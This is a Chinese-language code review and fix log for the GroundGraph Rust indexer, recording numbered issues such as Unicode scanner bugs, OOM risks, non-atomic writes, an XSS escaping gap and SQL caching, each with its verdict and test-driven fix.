- **手写扫描器的 totality 是项目基线**（CONTRIBUTING.md 明确要求），本批 #37/#46/#47/#56 加上第一批 #5/#6/#7/#13 显示**至少 8 处独立扫描器存在字符串/注释/Unicode 边界缺陷**。建议建立一个集中的 `scanner_proptest` 套件，对所有手写扫描器统一跑"任意 UTF-8 输入不 panic + 确定性"property test。

- **中文用户场景**：第一批的 #1（HTML UTF-8 损坏）+ 本批 #47（Unicode 标识符指纹失真）、#52（CJK 分词）、#53（slug 塌缩）显示**面向中文用户的核心管道仍有多处缺陷**——GroundGraph 文档主打中文场景，这些应是 P1 修复优先级。

- **协议合规**：第一批的 #8（MCP 帧格式）+ 本批 #38（id 处理）、#57（批量请求）显示 **MCP 实现距离规范合规还有明显距离**。如果 GroundGraph 想被严格 MCP 客户端（不只是 Cursor/Claude Desktop）使用，建议对照 MCP spec 系统性补齐。


---

## 处理结果（2026-06-12 复核）

每个问题先经源码复核，确认存在的按 TDD（先失败测试、后修复）处理；全量 `cargo test --workspace` 与 `cargo clippy --all-targets` 通过。

| # | 结论 | 处理 |
|---|------|------|
| 31 | 确认 | `parse_dart_route_constants` 输出统一过 `normalize_consumed_route_path`；`is_param_segment` 识别 `$`/`<` 形参段，服务端/客户端 `route_key` 对齐 |
| 32 | 确认 | `read_message` 增加 `MAX_FRAME_BYTES`（256 MB）上限，超限 `bail!` 不分配，新增不分配回归测试 |
| 33 | 按设计 | mtime+length 是经典 make 式权衡；doc 注释明确两类边界（touch 无害重跑 / 同长同 mtime 可能陈旧）与 `--force` 逃生门 |
| 34 | 按设计 | 全有或全无优先保证图的"同代一致性"；`index_repository` doc 注释写明取舍（混代图比重跑更危险） |
| 35 | 确认 | `append_stat` 增加 `File::lock` 排它锁（写完随句柄释放）；新增 8 线程 × 64 KB 行并发测试；MSRV 1.87→1.89 |
| 36 | 确认 | `parse_constructor` 剥离 `factory` 前缀，`parse_method` 排除 `factory `；工厂构造器注册为独立构造器节点 |
| 37 | 确认 | 新增 `ScanState` 跨行追踪三引号字符串；`update_depth` 在多行字符串内不计大括号，字符串内"声明"不再被解析 |
| 38 | 部分成立 | 增加 `jsonrpc != "2.0"` → `INVALID_REQUEST` 校验；"缺 id 即 notification"本就符合 JSON-RPC §4.1（任何 method 都可为通知）；`id:null` 因 serde 无法与缺失区分、按通知处理，已在注释声明限制 |
| 39 | 已覆盖 | 复核确认第一批 #3 的修复已覆盖全部 `innerHTML` 注入点（`escapeAttr(e.layer)`、`escapeAttr(classes)`、`escapeText` 详情/统计行） |
| 40 | 确认 | dashboard `meta` 只嵌仓库名（`repo`），不再嵌绝对路径；`section()` 折叠错误时把 `repo_root` 前缀替换为 `<repo>`，防错误链泄露宿主路径 |
| 41 | 按设计 | `indexer IS NULL` 即"无主数据"（人工确认链、外部导入），任何 indexer 重跑都不得删除；doc 注释写明契约 |
| 42 | 误报 | `language()` 前缀匹配以 `_` 锚定（`dart_` 不会误配 `dartx_`）；`language()` 与 `language_of()` 语义本不同（节点种类语言 vs 路径推断） |
| 43 | 已修复 | 与"继续审查"阶段发现重合：`expand_subgraph` 已有 `SUBGRAPH_NODE_BUDGET` 预算 + `truncated` 标志，CLI `--depth` 无法触发无界遍历 |
| 44 | 确认 | `{id}` / `:id` / `<int:id>` / `${id}` / `$id` 统一规范化为 `:param`；`route_key` 折叠全部形参段 |
| 45 | 确认 | 新增 `collect_python_router_prefixes`：`APIRouter(prefix=...)` / `Blueprint(url_prefix=...)` 前缀传播到所属装饰器路由 |
| 46 | 误报 | `i + 2 < b.len()` 是"闭合后还有内容才继续扫"的正确条件；新增 EOF 紧邻 docstring 的回归测试钉死行为 |
| 47 | 确认 | `normalize` / `consume_identifier` 改 `is_alphanumeric()`，CJK/Unicode 标识符与 ASCII 一样折叠为 `ID` token |
| 48 | 确认 | `try_run` 改双线程排水 + `try_wait` 轮询 + 墙钟预算（默认 600 s，`GROUNDGRAPH_DART_ANALYZER_TIMEOUT_SECS` 可调），超时 kill；`parse_response` 改逐行恢复，坏行计数进 diagnostics 不再丢整批 |
| 49 | 确认 | `concat_string_literals` 改按 `char` 迭代（UTF-8 安全）；仅解码 `\"`/`\\`，其余转义原样保留（grep 可达性优先于"还原"） |
| 50 | 确认 | `simple_glob_match` 增加失败状态 memoization，病态 `**/**/…` 模式从指数级降为多项式，新增性能断言测试 |
| 51 | 确认 | 新增 `read_snippet_lines`：拒绝绝对路径/`..` 穿越、2 MB 大小上限、`from_utf8_lossy` 容错非 UTF-8 |
| 52 | 确认 | `tokenise_keywords` 对非 ASCII 串改用重叠 bigram（与 FTS 层一致），中文关键词可命中结构层名称/ID |
| 53 | 确认 | `slugify` 空槽时回退 `s<fnv1a64>` 内容哈希，纯中文/日文标题 ID 不再全部塌缩为 `section` |
| 54 | 大体误报 | 单事务一次重建本就正确；顺手把 INSERT 改 `prepare_cached` |
| 55 | 确认 | `COMMIT` 单独执行；`wal_checkpoint` / `wal_autocheckpoint=1000` 改为 best-effort（失败不再连累已成功的事务），新增状态恢复测试 |
| 56 | 确认 | 新增 `StripState` 跨行追踪块注释（含嵌套）与三引号字符串；块注释里的标识符不再产生假边 |
| 57 | 确认 | `dispatch` 对 `[` 开头的批量数组直接返回 `INVALID_REQUEST` + 明确错误文案（MCP 规范已移除 batch），不再抛笼统 parse error |
| 58 | 确认 | `search` / `impact` / `candidate show` 三处 `--json` 加 `conflicts_with = "format"`：显式同传硬报错，单独使用保持兼容 |
| 59 | 确认 | `mermaid_id` 严格 sanitize 为 `[A-Za-z0-9_]`（有损折叠时附 FNV 短哈希防 `lib/auth` 与 `lib.auth` 合并）；AI 提示词围栏改四反引号容忍内部 ``` |
| 60 | 确认 | `disambiguate_duplicate_test_ids` 改两遍 O(N)：先 `HashMap` 计数 slug，再单遍重命名 |

**统计**：确认修复 22，按设计/政策澄清 4（#33 #34 #41 +#54 顺手优化），误报 3（#42 #46 #54），已被先前修复覆盖 2（#39 #43）。

---

## 第三批扩展（#61–#80，2026-06-13 续审）

**续审背景**：第一批 30 + 第二批 30 中已有 27 个有效条目被修复/澄清，3 个误报已标注。本轮从前两批**未深查的 5 个角度**重新发起并行审查：测试代码、配置/构建/CI、子进程与信号、edge/evidence 领域模型、并发 IO/tree-sitter。5 个 agent 共返回 49 个候选，去重后（Agent 报的 N1 与第一批 #25 同源）挑选 20 个新发现追加如下。编号从 61 开始。

### High（10 个）

### 61. `EvidenceKind` 全部 6 个变体从未被任何生产代码写入数据库（领域模型死代码）

- **位置**：`crates/groundgraph-core/src/evidence.rs:9-48`；对照 `crates/groundgraph-store/src/repositories.rs:292-322`（`upsert_evidence`/`list_evidence_for_artifact`）
- **问题**：搜索整个 `crates/`（排除 `target/` 和 `.groundgraph/`）：`EvidenceKind::{DocSection, DartDocComment, DartTestCall, DartGroupCall, Import, GitDiff}` 的所有出现位置只有三类——枚举定义本身、`as_str`/`from_str`/`ALL` 实现、单元测试 fixture。`Store::upsert_evidence` 和 `Store::list_evidence_for_artifact` **没有任何生产 caller**——所有调用都在 `repositories.rs` 的 decode_tests / `tests/repositories.rs` 中。这意味着 `evidence` 表在生产索引中**永远为空表**，`EvidenceKind` 整个领域模型（enum、`as_str`/`from_str`、6 个变体、`SELECT_EVIDENCE_COLS`、`evidence_from_row`、`idx_evidence_artifact` 索引）都是 P0 设计时规划但从未落地的**死代码**。文档证据/章节锚点/import 关系/测试调用证据本应从这里写入，实际却通过 `evidence_json` 字段塞进 `EdgeAssertion`（参见 `dart_indexer.rs:655-661` 的 `build_reference_evidence_json`）。
- **触发场景**：任何"展示证据"的需求（focus card 列出代码行证据片段、人工评审追溯证据来源）目前都没有底层数据——graph view 用 `edge.evidence_json` 临时拼出零散信息，`list_evidence_for_artifact` 永远返回空 Vec。
- **建议**：(a) 删除 enum + 表 + repo helper 让 `evidence_json` 成为唯一来源；(b) 或把 dart_indexer/docs_indexer 切换为真正写入 evidence 表。给每个 EvidenceKind 写一条覆盖测试证明生产路径会 emit 它。

### 62. 跨 indexer 的 edge UPSERT 字段无差别覆盖：SCIP 与 heuristic 边 ID 完全相同，confidence/evidence/indexer 被后写者覆盖

- **位置**：`crates/groundgraph-core/src/edge.rs:189-209`（`EdgeAssertion::declared` 用 `format!("edge::{}::{}::{}", kind, from, to)`）；`crates/groundgraph-engine/src/scip_overlay.rs:234-250` + `crates/groundgraph-engine/src/dart_indexer.rs:643-662`；`crates/groundgraph-store/src/repositories.rs:202-258`（upsert 全字段覆盖）
- **问题**：`EdgeAssertion::declared/fact` 工厂的 ID 构造**完全由 `(kind, from, to)` 决定**，不含 `indexer`、`certainty`、`evidence`、`source_file`。这意味着：(1) Dart lightweight 适配器先写入一条 `Calls(A,B)` 边（indexer=`dart_lightweight`、evidence=`line=12,snippet=foo,resolver=name`），(2) SCIP 后写入相同 `Calls(A,B)`（indexer=`scip`、evidence=`line=12,resolver=scip`）。两条边 ID 相同，第二条 UPSERT 完全覆盖第一条的字段——`indexer`、`evidence_json`、`source_file` 全部被覆盖。SCIP overlay（`scip_overlay.rs:195-197`）确实先 `clear_indexer_outputs(RESOLVER_SCIP)` 清掉 SCIP 自己的旧行，然后调用 `delete_precision_edges_for_files_except` 删掉同文件的 heuristic Calls/References，但这套保护**仅在"SCIP 是最后写入的 indexer"时成立**——(a) 之后若有其他 indexer（如某个未来 `dart_lsp`）重新写入该边，SCIP 数据被无差别覆盖；(b) `delete_precision_edges_for_files_except` 只删 `source_file` 匹配的边，**跨文件的同一条边不会被清理**；(c) `confidence` 字段在两个 indexer 间若值不同会被无声覆盖。
- **触发场景**：多 indexer 并行演进（dart_lightweight + dart_analyzer + scip），任何一个晚于其他写入相同 `(kind, from, to)` 都会覆盖；增量重索引部分文件时也可能让已被 SCIP 升级的边回退。
- **建议**：把 `indexer` 加入 edge ID 复合键（`format!("edge::{kind}::{from}::{to}::{indexer}")`），或在 UPSERT 的 ON CONFLICT 子句中只覆盖非关键字段、保留首写者的 evidence/confidence/indexer。

### 64. `node_from_row_recognizes_all_kinds_and_rejects_unknown` 手写清单漏约 40 种 NodeKind

- **位置**：`crates/groundgraph-store/src/repositories.rs:872-941`
- **问题**：测试名宣称 "recognizes all kinds"，但实际手写 `kinds` 数组只列举约 42 种，完全遗漏 `python_*`(4)、`typescript_*`(5)、`java_*`(6)、`csharp_*`(6)、`ruby_*`(4)、`php_*`(6)、`kotlin_*`(6)、`db_table`、`sql_mapper_stmt`、`http_route`——合计约 40 种（与第一批 #18 不同：#18 修的是 `language_traits.rs::ALL_KINDS` 测试矩阵；本处是 `repositories.rs` 的 store 解码矩阵）。如果 `node_from_row` 的 `kind` 解码 match 漏掉 `python_class` 等分支，下游 `list_all_nodes()` 会 panic 或返回 `unknown node kind`，但这个测试不会捕获——因为它从不插入这些 kind 的行。
- **触发场景**：新增 NodeKind 后 store 解码分支漏写不会被测试发现。
- **建议**：直接迭代 `NodeKind::ALL`，对每个 kind 插入一行、断言可被 `list_all_nodes()` 读回；再保留"unknown kind 拒绝"分支。

### 67. `treesitter.rs` 与 `fulltext_indexer.rs` 的 `par_iter` 都无文件大小上限，rayon 并发读入可触发 OOM

- **位置**：`crates/groundgraph-engine/src/treesitter.rs:1454-1472`、`crates/groundgraph-engine/src/fulltext_indexer.rs:93-123`
- **问题**：两处 `par_iter` 的每个 rayon worker 直接 `std::fs::read_to_string(&file.absolute)` 全量读入文件，无大小上限。rayon 默认全局池 = CPU 核心数（8/16/32），同一时刻最多 N 个文件被完整加载到堆上。仓库里的 `vendor/`、生成的 parser 表（如 `typescript-tests/cases/**/*.ts`、auto-generated protobuf、webpack bundle）单文件经常达几十到几百 MB；8 核机器同时读 8 个 100 MB 文件 = 800 MB+ 临时驻留，加上 sync_channel(1024) 缓冲队列里可能还积压着上千个 `String`。一个 monorepo 里偶然出现的 1 GB 单文件足以让 `index` OOM-kill。`fulltext_indexer` 的 `slice_span` 虽有 `MAX_BODY_CHARS=8000` 保护单条 body，但**未保护文件级读入**；`treesitter::parse_budget` 是时间门，不是大小门。
- **触发场景**：在大型 monorepo（含生成代码、protobuf 编译产物、webpack bundle）上跑 `groundgraph index`。
- **建议**：读入前 `std::fs::metadata(path)?.len()` 与上限（如 5 MB）比较，超限记入 `result.skipped_oversized` 后跳过；与 `parse_budget` 配合（先容量门，再时间门）。

### 71. `connect::write_manifest` & `business_candidates::apply_review` 对用户 YAML 使用非原子 `std::fs::write`

- **位置**：`crates/groundgraph-engine/src/connect.rs:504-516`；`crates/groundgraph-engine/src/business_candidates.rs:425-431`
- **问题**：（与第一批 #17 / 第二批 #59 不同：#17 是 cli 命令的 `write_to`，#59 是 `init.rs`；本条是**引擎层**用户人工产出。）项目已有 `groundgraph-cli/src/commands/output.rs::write_atomic` 工具（`tempfile::NamedTempFile::new_in` + `persist`，第一批 #17 修复），且 `propose.rs`、`connect.rs:12`、`graph.rs`、`search.rs`、`dashboard.rs`、`business_doc.rs`、`impact.rs` 全部走 `write_atomic`。但引擎层的 `connect::write_manifest`（把 AI 候选合并写入 `.groundgraph/links.yaml`）和 `business_candidates::apply_review`（写 `business_logic.yaml` 的复核结果）仍然走 `std::fs::write(path, yaml)`。崩溃/断电/磁盘满会留下半截 YAML，下次 `groundgraph index` 解析失败；`apply_review` 是用户人工复核的产出，丢一次就需要重新走完整 AI 流程。
- **建议**：把 `write_atomic` 提升到 `groundgraph-engine`，两处改用之。

### 73. `EdgeStatus::Deprecated` 与 `EdgeSource::Filesystem` 在生产代码中从未被写入（不可达分支）

- **位置**：`crates/groundgraph-core/src/edge.rs:148-168`（`EdgeStatus::Deprecated`）、`edge.rs:97-103`（`EdgeSource::Filesystem`）；对照生产 indexer 写入路径
- **问题**：两个独立但同类的死代码：
  1. **`EdgeStatus::Deprecated`**：生产代码 indexer 在删除/重写边时**总是 `DELETE` 行而非 UPDATE 为 `Deprecated`**：`clear_indexer_outputs` 直接 `DELETE FROM edge_assertions WHERE indexer=?`，`delete_precision_edges_for_files_except` 直接 `DELETE FROM edge_assertions WHERE source_file=?`。`edge_assertions.status` 列在所有真实数据库里永远是 `'confirmed'`，`EdgeStatus::Deprecated → EdgeConfidence::Low` 的派生规则和 graph view 的 `EdgeStatus::Deprecated => GraphStatus::Stale` 映射都是**永远不可达的死分支**。
  2. **`EdgeSource::Filesystem`**：生产搜索 0 次写入，只有 `edge_confidence.rs`/`graph_equiv.rs` 测试。`ExternalManifest`（slice/graph/feature_pack/requirements_md_indexer/links_indexer）、`Markdown`（docs_indexer）、`GitDiff`（dead_code）都有生产 caller，唯独 `Filesystem` 没有。
- **触发场景**：consumer 按 `EdgeStatus::Deprecated` 或 `EdgeSource::Filesystem` 过滤会得到空集；用户期望"被废弃但保留可追溯"的边（PRD 暗示的"stale 而非 delete"语义）实际从未被实现。
- **建议**：(a) 删除两个变体 + 对应死分支；(b) 或真正接入——`Deprecated` 改为 `UPDATE … SET status='deprecated'`，`Filesystem` 接入 filesystem walk indexer。

### 76. `docs_indexer.rs` 无大小门 + 主 walk 未 `sort_by_file_name`，破坏确定性（违反 D4）

- **位置**：`crates/groundgraph-engine/src/docs_indexer.rs:81-109, 119-162, 354-361`
- **问题**：两层问题：
  1. `WalkDir::new(&abs_root).into_iter().filter_entry(...).filter_map(|e| e.ok())`（第 81 行和第 119 行）**都没有** `.sort_by_file_name()`。`walkdir` 默认按 OS `readdir` 顺序返回条目，Linux ext4 / macOS APFS 顺序都不稳定；这是 GroundGraph 项目约束 "D4 determinism" 的直接违规。`requirements_md_indexer.rs:98` 和 `treesitter.rs:1929-1974`（后者有 `out.sort_by(...)` 收尾）都做了排序，唯独这里没有。
  2. `index_one_file` → `std::fs::read_to_string(abs_path)`（第 360 行）无大小上限。一个 50 MB 的 `CHANGELOG.md` 或 `vendor/some-sdk/docs/api.md` 会被一次性读入并交给 `parse_markdown` 全量处理。
- **建议**：给两个 WalkDir 加 `.sort_by_file_name()`；`index_one_file` 入口 `metadata()?.len()` 与上限比较，超限跳过并 `result.skipped_oversized += 1`。

## 续审统计

**第三批新增 20 个**（编号 61–80）：

| 严重度 | 数量 |
|---|---|
| High | 10 |
| Medium | 9 |
| Low | 1（合并到 Medium 中） |
| **合计** | **20** |

加上第二批原有的 30 个，**issues2.md 现共记录 50 个新问题**（编号 31–80）。

按主题聚类（第三批 20 个）：

| 主题 | 涉及条目 |
|---|---|
| **领域模型与生产代码脱节**（EvidenceKind / EdgeStatus::Deprecated / EdgeSource::Filesystem 死代码） | #61、#73 |
| **跨 indexer 数据完整性**（edge ID 冲突覆盖、SCIP 多调用点 dedup） | #62、#75 |
| **数值边界**（confidence NaN/Inf/越界） | #63 |
| **测试覆盖空洞**（store 解码漏 40 NodeKind / FTS 表 / git 退出码 / self-host 超时） | #64、#66、#78、#79 |
| **测试并发 UB / silent-pass**（EnvGuard 无锁、Dart 缺失时 golden 全 pass） | #65、#66 |
| **OOM / 资源耗尽**（treesitter/fulltext par_iter 无大小门、子进程无进程组、sourcekit lock） | #67、#68、#69 |
| **供应链 / release 链**（serde_yaml 废弃、tar 穿越、sha256 路径、二进制 strip） | #70、#80 |
| **协议契约 / 配置演化**（schema_version 缺失、YAML 非原子写入、外键缺失） | #71、#72、#74 |
| **子进程超时**（scip_runner / lsp_client Drop） | #77 |
| **确定性违规**（docs_indexer 未排序） | #76 |

**核心续审结论**：

- **第二批已修复的 27 个条目揭示了项目工程质量较高**——但第三批发现的 20 个新问题显示**仍有系统性盲区**：(1) **领域模型与生产实现的脱节**（#61 EvidenceKind 完全死代码、#73 EdgeStatus/EdgeSource 死分支）是设计阶段产物未落地的遗留；(2) **跨 indexer 的数据完整性**（#62 edge ID 冲突覆盖、#63 confidence 无校验、#75 SCIP 多调用点丢失）是多 indexer 架构的固有复杂度未被充分抽象；(3) **测试网 silent-pass 陷阱**（#65 EnvGuard 数据竞争 UB、#66 Dart 缺失时 golden 全 pass）让 CI 绿色但实际无防护——这是最危险的，因为它给了虚假的安全感。

- **与前两批的呼应**：第二批的核心结论提到"手写扫描器的 totality 是项目基线"，第三批 #63/#64/#78 显示**测试基线本身也有空洞**——`node_from_row` 测试漏 40 种 NodeKind、proptest 生成器不出 `\n`、EXPECTED_TABLES 漏 FTS 表。建议把"测试矩阵完整性"也作为一个独立的 lint 维度（如 `for kind in NodeKind::ALL { assert!(...) }` 强制穷举）。

- **子进程管理的系统性弱点**：第一批 #25、第二批 #32/#48 已修了部分，但第三批 #68（无进程组）、#69（Drop SIGKILL）、#77（scip_runner 无超时、lsp_client Drop 无超时）显示**整个子进程生命周期管理**仍有多处独立缺陷。建议建立一个集中的 `ChildGuard` RAII 类型，统一处理：进程组设置、优雅 shutdown 超时、reader 线程 join、fd 清理。

- **release 链与供应链**：第三批 #70（serde_yaml 废弃）+ #80（tar 穿越、sha256 绝对路径、二进制未 strip）揭示了 GroundGraph 在分发链上的多个独立风险——这些不是日常开发可见的，但一旦被利用或下载用户体验受影响就是 P0。建议把 release 脚本纳入 CI 定期 dry-run 验证。

**最值得优先修复的 5 个（第三批）**：
1. **#61（EvidenceKind 整个领域模型死代码）**——P0 设计时规划但从未落地的产品契约，建议立即决策保留或删除
2. **#62（跨 indexer edge UPSERT 无差别覆盖）**——SCIP 与 heuristic 共享相同 ID，写入顺序异常会让高置信边静默回退
3. **#65/#66（测试 silent-pass）**——CI 绿色但 Dart golden 回归网在主流 CI 上完全不执行，是测试质量的根本性隐患
4. **#67（par_iter OOM）**——大型 monorepo 单文件 + rayon 并发读入是真实 OOM 触发路径
5. **#70（serde_yaml 废弃）**——AI 生成 YAML 是外部输入面，废弃生态拿不到安全补丁

---

## 处理结果（2026-06-13 复核 #61–#130）

> 本轮针对 issues2.md 的 #61–#130（70 个）做中立复核，对确认成立者按 TDD 修复。
> **本轮已处理 18 项**（修复 10、误报/不可复现 5、按设计 3），已从 issues2.md 移除并记录于此；
> 其余 52 项仍为活跃（real-but-deferred 或本轮未深查），保留在 [issues2.md](issues2.md)。
> 全量 `cargo clippy --workspace --all-targets -- -D warnings` 与 `cargo test --workspace` 均通过（0 失败）。

### 判定汇总

| 编号 | 判定 | 处理 |
|---|---|---|
| #64 | 成立 | 已修复（TDD） |
| #67 | 成立 | 已修复（TDD） |
| #71 | 成立 | 已修复（TDD） |
| #76 | 成立 | 已修复（TDD） |
| #78（part 1） | 成立 | 已修复（TDD） |
| #84 | 成立 | 已修复（代码审查，无 JS 测试基建） |
| #92 | 成立 | 已修复（TDD） |
| #97 | 成立 | 已修复（TDD） |
| #98 | 成立 | 已修复（TDD） |
| #129 | 成立 | 已修复（TDD） |
| #90 | 误报 | clap 已强制子命令，裸跑打印 help + exit 2 |
| #95 | 误报 | `ported_names ⊆ source_names`，不可能下溢 |
| #120 | 误报 | `strip_noise` 已移除字符串字面量内容，大小写无关 |
| #121 | 误报 | 前提算术有误（`0xFF`→`"0"`→trivial） |
| #122 | 误报 | 生产中 `from_file` 恒非空，路径不可达 |
| #61 | 按设计 | 规划未落地，`edge.evidence_json` 为现行来源 |
| #62 | 按设计 | 现有清理路径已覆盖真实写序 |
| #73 | 按设计 | 前瞻性变体，保留备用 |

### 已修复（TDD，附测试名）

**#97 SUPPORTED_LANGUAGES 漏 C#/Ruby/PHP/Kotlin**
- 修复：`treesitter.rs` 的 `SUPPORTED_LANGUAGES` 补齐 `csharp`/`ruby`/`php`/`kotlin`（8→12）。
- 测试：`treesitter::driver_capability_tests::supported_languages_matches_spec_for_language`——断言常量与 `spec_for_language` 规范集一致，防再次 drift。

**#129 php_test_of 过宽匹配**
- 修复：`php_treesitter.rs` 收紧为 PHPUnit 惯例——`test` 后须接大写字母或下划线，`testingHelper`/`testable` 不再被判为 TestCase。
- 测试：`php_treesitter::tests::php_methods_with_lowercase_after_test_stay_structural`。

**#64 node_from_row 测试漏约 40 NodeKind**
- 修复：`repositories.rs::node_from_row_recognises_all_kinds_and_rejects_unknown` 改为遍历 `NodeKind::ALL`（≥80 种）逐一往返断言（`BTreeSet<&str>` 去重，因 `NodeKind` 未实现 `Ord`）。

**#78（part 1）EXPECTED_TABLES 漏 node_fts**
- 修复：`tests/migrations.rs` 的 `EXPECTED_TABLES` 加入 `"node_fts"`。
- 注：建议中的"断言 FTS 触发器"为误解——本项目 FTS 由 `rebuild_fulltext` 整表重建，无 `node_fts_ai/ad/au` 触发器，故无需断言。part 2（`run_git` 退出码）未在本轮处理，仍活跃。

**#67 par_iter 无大小门（OOM）**
- 修复：新增 `source_text::MAX_INDEX_FILE_BYTES`（5 MiB）+ `is_oversized_source`；`treesitter`/`fulltext_indexer`/`docs_indexer` 读入前先过容量门，`TsIndexResult`/`TreeSitterLangResult` 增 `skipped_oversized` 计数，CLI `index` 对超限跳过输出告警（与 `parse_timeouts` 一致）。
- 测试：`source_text::tests::is_oversized_source_flags_only_files_past_budget`、`treesitter::driver_capability_tests::oversized_source_files_are_skipped`。

**#71 引擎层非原子写**
- 修复：新增 `groundgraph-engine::atomic_write::write_atomic`（`NamedTempFile` + `persist`）；`connect::write_manifest` 与 `business_candidates::apply_review` 改用之。
- 测试：`atomic_write::tests::*`。

**#76 docs_indexer 确定性 + 大小门**
- 修复：两处 `WalkDir` 加 `.sort_by_file_name()`（修复 D4 确定性违规）；`index_one_file` 入口加 `is_oversized_source` 跳过超大文档。

**#98 C/C++ 预处理指令污染 BM25**
- 修复：`fulltext_indexer::extend_over_leading_comments` 的 `#` 分支加 `is_c_preprocessor_directive` 守卫，`#include`/`#define`/`#ifdef`… 不再折进函数体；Python `#` 注释与 Rust `#[attr]` 仍保留。
- 测试：`fulltext_indexer::tests::c_preprocessor_directives_do_not_fold_into_the_symbol_body`、`hash_comments_and_rust_attributes_still_fold`。

**#92 stats --reset 静默成功 / 吞 --json**
- 修复：`stats.rs` reset 分支区分账本是否存在（不存在打印"无需清空"）；`--reset --json` 输出 `{"reset":true,"existed":<bool>,"path":...}`。
- 测试：`cli/tests/stats.rs::stats_reset_json_emits_machine_readable_output`、`stats_reset_reports_when_ledger_absent`。

**#84 webui esc() 未转义引号（XSS）**
- 修复：`webui/index.html` 的 `esc()` 追加 `"`→`&quot;`、`'`→`&#39;`，闭合 `data-id="${esc(nb.id)}"` 的属性逃逸向量。
- 验证：纯增量转义，对合法数据零行为变化；该仓库 webui 无 JS 单测基建，按代码审查确认。

### 误报 / 不可复现（源码核实）

**#90 裸运行静默退出 exit 0**——误报。`Cli.command: Commands` 为非 `Option` 子命令，clap v4 强制要求；实测 `groundgraph` 裸跑打印完整 help 并 `exit 2`。

**#95 missing_names 可能下溢**——误报。`port_coverage.rs` 对每个源符号先 `source_names.insert(key)`（行 369），命中后才 `ported_names.insert(key)`（行 380，同一 key），故 `ported_names ⊆ source_names`，`source_names.len() - ported_names.len()` 永不下溢。

**#120 SQL IO 检测大小写敏感**——误报。`symbol_facts` 的 `strip_noise` 会移除字符串字面量内容，`db.Exec("select …")` 里的 SQL 关键字（无论大小写）都已被删除，故大小写敏感与否对 IO 检测结果无影响。

**#121 0xFF 被当 magic constant**——误报（前提算术有误）。`is_trivial` 对 Int 取 `value.chars().filter(is_ascii_digit)`：`"0xFF"`→`"0"`（`F` 非 ascii_digit），命中 `"0"` 判为 trivial 而被过滤；issue 称得 `"0255"` 不成立。真实潜在量级问题（部分 hex 掩码被误判 trivial）方向与 issue 相反、影响极小，暂不处理。

**#122 ruby require_relative 空 from_file 丢失**——误报（不可复现）。仅当 `from_file == ""` 时 `Path::new("").parent()` 返 `None`；生产中被索引的 Ruby 文件 rel path 恒非空（顶层文件得 `Some("")` 而非 `None`），该分支不可达。

### 按设计（保留，无功能缺陷）

**#61 EvidenceKind 死代码**——领域模型规划未落地；现行证据经 `edge.evidence_json` 承载。属设计债务而非功能缺陷；保留枚举与 store helper 以备后续接入。

**#62 跨 indexer edge UPSERT 覆盖**——`(kind,from,to)` 复合 ID 配合 `clear_indexer_outputs` + `delete_precision_edges_for_files_except` 已覆盖真实写序（SCIP 末写）；"未来 indexer 晚于 SCIP 覆盖"无现存触发路径。保持现状。

**#73 EdgeStatus::Deprecated / EdgeSource::Filesystem 死分支**——前瞻性变体（PRD 的"stale 而非 delete"语义占位）；当前 indexer 走 DELETE。保留以备未来接入，非缺陷。

# GroundGraph 代码审查报告（归档：issues3.md #131–#180 处理结果）

> **归档时间**：2026-06-13
> **来源**：[issues3.md](issues3.md)（第五批 #131–#180，共 50 个）。本文件记录**已处理项**的 verdict + 证据。
> **处理方式**：中立复核真伪 → 成立项 TDD 修复（或安全/文档审查修复）→ 误报 / 按设计 / 延后均附理由。
> **验证**：全量 `cargo clippy --workspace --all-targets -- -D warnings`（0 警告）与 `cargo test --workspace`（0 失败，含本轮新增测试）均通过。
>
> **不要在本文件追加新问题**——新发现请写入 issues 源文件。

---

## 处理结果（2026-06-13 复核 第一轮）

本轮共处理 **15 项**（issues3.md 14 项 + issues2.md #70）：修复 11（代码 6 + 文档 4 + 文档部分 1）、误报 1、按设计 1、延后 2（#139、#70，附理由）。
其中 issues3.md 的 12 项已闭环（修复 10 + 误报 1 + 按设计 1），#148(余)/#139 仍部分活跃/延后。

### 已修复 · 代码（TDD）

**#134 `every_language_spec_opts_into_the_call_resolver` 漏测 csharp/ruby/php/kotlin**
- 复核：成立。该守门测试 docs 注释称"every language has opted in"，但 specs 数组只列 9 门（rust/python/go/java/c/cpp/swift/typescript/tsx）；`csharp/ruby/php/kotlin_treesitter.rs` 均已设 `call_idents_of`，却不在断言内——删了它们的 wiring 这条测试不会红。
- 修复：`rust_treesitter.rs` 把 specs 扩到 13 门（补 `CSHARP_SPEC`/`RUBY_SPEC`/`PHP_SPEC`/`KOTLIN_SPEC`）。
- 测试：`rust_treesitter::tests::every_language_spec_opts_into_the_call_resolver`（现断言 13 门全部 opt-in）。

**#138 FTS5 `node_fts` 从未 OPTIMIZE，段无限累积拖慢 BM25**
- 复核：成立。`rebuild_fulltext` 为 `DELETE` + 逐行 `INSERT`，全工程无 `'optimize'` 调用；多次 `index` 后 FTS5 段累积，`MATCH`/`bm25()` 持续变慢。
- 修复：`repositories.rs::rebuild_fulltext` 在所有 INSERT 之后、同一写事务内执行 `INSERT INTO node_fts(node_fts) VALUES('optimize')`，把段合并为一。
- 测试：`store/tests/repositories.rs::repeated_fulltext_rebuilds_stay_queryable_after_optimize`——连续 8 次重建后单命中仍正确，证明 optimize 不报错、不破坏段合并。

**#136 `delete_precision_edges_for_files_except` 用未缓存 `prepare`**
- 复核：成立。SCIP 抑制路径按源文件数（django 3026）调用，SQL 为单一字面量却绕过 64 条语句缓存。
- 修复：`tx.prepare(...)` → `tx.prepare_cached(...)`，与 `clear_indexer_outputs`/`rebuild_fulltext` 一致。
- 验证：`store/tests/repositories.rs` 全绿（DELETE 语义不变）。

**#155 `fulltext_match` 用未缓存 `prepare`**
- 复核：成立。每次 `search` 跑两遍（all/any tokens）+ `checks` 再一次，SQL 为单一字面量。
- 修复：`self.conn.prepare(...)` → `prepare_cached(...)`。
- 验证：`fulltext_rebuild_then_match_ranks_bodies_by_bm25` 等全绿（结果不变）。

**#157 `find_node`/`list_nodes_by_kind`/`list_all_nodes` 每次 `format!` 构造静态 SQL**
- 复核：成立。`SELECT_NODE_COLS` 为 `&'static str`，但三处读路径每次 `format!` 拼一个可预测 `String`，`find_node` 在 BFS 每跳被调数千次。
- 修复：把列清单改为 `macro_rules! select_node_cols!`，用 `concat!` 在编译期折出 `const FIND_NODE_SQL`/`LIST_NODES_BY_KIND_SQL`/`LIST_ALL_NODES_SQL`，三处改用常量 + `prepare_cached`，零分配。
- 验证：`upsert_node_is_idempotent_and_round_trips`/`list_all_nodes_returns_every_inserted_kind` 等全绿。

**#141 `fts_tokens` CJK bigram 无预分配**
